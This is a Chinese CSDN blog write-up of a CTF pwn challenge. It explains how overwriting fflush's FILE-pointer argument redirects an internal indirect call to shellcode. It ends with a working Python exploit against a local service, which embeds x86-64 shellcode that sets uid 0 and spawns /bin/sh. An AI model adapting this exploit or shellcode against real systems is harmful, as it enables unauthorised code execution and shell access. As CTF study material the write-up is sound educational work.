@@ -1,0 +1,163 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   CTF-PWN之fsp-utilize漏洞利用
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年06月11日 23:35:08
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：256
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <p>
+     <strong>
+      写在前面
+      <em>
+      </em>
+     </strong>
+     ：总结一下这次比赛的收获吧。其他方面的收获就不多说了。主要还是说说比赛的事。总共20道题也就一题是pwn..一开始不会做，经过师傅的点播之后，最终拿到shell。这道题就是一个很小的一个知识点，不过真佩服师傅老人家，咔！咔！咔！不到20分钟就做完了。贼溜！
+    </p>
+    <p>
+     <strong>
+      <em>
+       上题！！！
+      </em>
+     </strong>
+     <br/>
+     老规矩。先检查(其实无所谓啦，这几步是必做的工作)。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233241436?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     看到这个就要兴奋一下了。几乎啥保护都没开。直接溢出整段shellcode就得了呗。
+     <br/>
+     运行一下。发现在当前目录下生成了一个test文件，打开看看什么都没有，无视。(试运行只是为了知道程序的大致流程)。
+     <br/>
+     IDA反编译。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233251416?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以看到程序很小。这里它会以wb的方式打开一个test文件，这就会得到一个文件句柄，在使用fflush清空文件缓冲区时，存在一种利用方式。
+     <br/>
+     Fflush不是标准的库函数，用于清空文件缓冲区。
+     <br/>
+     <code>
+      Int fflush(FILE* stream)
+     </code>
+     ;经过大神的调试发现这里有种利用方式。
+    </p>
+    <p>
+     咱还是 具体的来调调。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233311073?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     第一个read它会往指定的内存store写数据。
+     <br/>
+     再通过fopen打开一个文件，返回了文件的指针(在堆上)。
+     <br/>
+     接着又通过read往stack写0xd0个数据，之后调用fflush。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233319917?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     Fflush的参数我们可以去覆盖它。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233327620?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     也可以通过这里来看(其实刚开始我也不知道可以这么看，反正我是调了几次才看到的最后的8个字节可以覆盖，新技能Get！)
+     <br/>
+     本来正确的流程应该将文件的指针作为fflush的参数，其实最主要的问题还是在于fflush的异常处理上(我感觉吧，这要不是师傅教我，打死我我也做不出来，一般这种库函数我都是跳过的，现在知道了:找漏洞，关键就在于试错，看看这些个函数异常时会发生什么，它是如何对异常进行处理的，漏洞往往在这些个地方)
+     <br/>
+     这里我主要还是讲讲怎么去调试一个库函数。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233345433?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以说每个库函数都会有这一段代码，这是为了接下来的 工作做些准备(我也不是很懂哈！)
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233400293?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这才是真正的fflush的函数调用。
+     <br/>
+     注意一下
+     <code>
+      jnz     short loc_7F158CD4CAD5
+     </code>
+     这个函数。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233407184?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这里会有个call指令，我们就是通过这个来执行shellcode。因为我们传的是store的地址，rbp是栈帧基址，通过第一次mov将一个值覆给rax，我就控制这个rax也为stack上的地址，在通过[rax+60]来取值。。。我感觉我已经解释不清楚了。其实懂点汇编的应该都懂得。我只是说给自己听罢了。在构造store的时候会碰到一些问题，因为我们要想让程序执行我们想要的地方就必须绕过一些条件判断。
+     <br/>
+     最后直接
+     <code>
+      call shellcode_addr
+     </code>
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170611233416746?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     贴上exp(还望大神们不要笑话):
+    </p>
+    <pre class="prettyprint"><code class=" hljs tex">from zio import *
+import struct
+
+target = ('127.0.0.1', 10000)
+io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
+c2=raw_input("go?")
+io.read_until('enter the secret:')
+payload=l64(0x8000)+'a'*0xd0+l64(0x06010A0+0xd0)+'a'*0x50+l64(0x06010A0+0x138)+'<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>31<span class="hljs-command">\xff</span><span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>31<span class="hljs-command">\xc</span>0<span class="hljs-command">\xb</span>0<span class="hljs-command">\x</span>69<span class="hljs-command">\x</span>0f<span class="hljs-command">\x</span>05<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>31<span class="hljs-command">\xd</span>2<span class="hljs-command">\x</span>48<span class="hljs-command">\xbb</span><span class="hljs-command">\xff</span><span class="hljs-command">\x</span>2f<span class="hljs-command">\x</span>62<span class="hljs-command">\x</span>69<span class="hljs-command">\x</span>6e<span class="hljs-command">\x</span>2f<span class="hljs-command">\x</span>73<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>48<span class="hljs-command">\xc</span>1<span class="hljs-command">\xeb</span><span class="hljs-command">\x</span>08<span class="hljs-command">\x</span>53<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>89<span class="hljs-command">\xe</span>7<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>31<span class="hljs-command">\xc</span>0<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>57<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>89<span class="hljs-command">\xe</span>6<span class="hljs-command">\xb</span>0<span class="hljs-command">\x</span>3b<span class="hljs-command">\x</span>0f<span class="hljs-command">\x</span>05'+'a'*0x10
+io.writeline(payload)
+io.read_until('enter your name:')
+payload='a'*0xc8+l64(0x06010A0)     <span class="hljs-special">#</span>store
+io.writeline(payload)
+
+io.interact()</code></pre>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/73076523
+  </div>
+  <div class="tags-box artic-tag-box">
+   <span class="label">
+    文章标签：
+   </span>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=shell&amp;t=blog" target="_blank">
+    shell
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=漏洞&amp;t=blog" target="_blank">
+    漏洞
+   </a>
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
